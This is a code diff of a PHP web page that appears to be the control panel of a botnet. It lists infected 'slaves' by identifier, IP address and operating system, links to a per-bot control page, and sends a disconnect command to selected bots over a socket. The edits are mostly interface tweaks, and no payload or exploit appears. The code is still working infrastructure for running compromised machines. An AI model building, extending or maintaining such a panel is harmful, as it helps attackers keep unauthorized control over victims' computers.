@@ -6,14 +6,12 @@ require_once "request.php";
 $request = new Request();
 $sock = $request->createSocket();
 
-if (isset($_POST['select']) && isset($_POST ['action'])) {
-	$action = $_POST ['action'];
-	
-	if ($action == "Disconnect") {
+if (isset($_POST['select'])) {
+	if (isset($_POST['disconnect'])) {
 		$request->write($sock, 10);
 		$request->write($sock, count($_POST ['select']));
 	}
-	foreach ( $_POST ['select'] as $slave ) {
+	foreach ($_POST['select'] as $slave) {
 		$request->write($sock, $slave);
 	}
 } else {
@@ -52,9 +50,9 @@ $(document).ready(function() {
 					<div class="form-group">
 						<form method="POST">
 
-							<h4 class="section-title">Bot List</h4>
+							<h4 class="section-title">Bot List (<?php echo count($slaves); ?>)</h4>
 							<div class="form-group" align=right>
-								<button type="submit" name="action" value="Disconnect" class="btn btn-default">Disconnect</button>
+								<button type="submit" name="disconnect" class="btn btn-default"><i class="fa fa-home"></i> Disconnect</button>
 
 							</div>
 							
@@ -100,7 +98,7 @@ $(document).ready(function() {
 					}
 					
 					for($i = $start; $i < $start + $max; $i ++) {
-						if (! isset($slaves [$i])) {
+						if (!isset($slaves[$i])) {
 							break;
 						}
 						$slave = $slaves [$i];
@@ -112,7 +110,8 @@ $(document).ready(function() {
 						echo printTableData($slave->getIdentifier());
 						echo printTableData($slave->getIP());
 						echo printTableData($slave->getOperatingSystem());
-						echo printTableData("<a href='bot.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
+						//echo printTableData("<a href='bot.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
+						echo printTableData("<a href='bot.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");
 						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
 						echo "</tr>\n";
 					
@@ -127,16 +126,16 @@ $(document).ready(function() {
 
 								<ul class="pagination pagination-demo">
 						
-							<?php
-							if ($page != "all") {
-								$page ++;
-							}
-							echo '<li><a href="bots.php?page=' . ($page - 1) . '">&laquo;</a></li>';
-							echo '<li><a href="bots.php?page=' . ($page) . '">' . ($page) . '</a></li>';
-							echo '<li><a href="bots.php?page=' . ($page + 1) . '">&raquo;</a></li>';
-							?>
-							
-						</ul>
+									<?php
+									if ($page != "all") {
+										$page ++;
+									}
+									echo '<li><a href="bots.php?page=' . ($page - 1) . '">&laquo;</a></li>';
+									echo '<li><a href="bots.php?page=' . ($page) . '">' . ($page) . '</a></li>';
+									echo '<li><a href="bots.php?page=' . ($page + 1) . '">&raquo;</a></li>';
+									?>
+									
+								</ul>
 							</div>
 						</div>
 					</div>
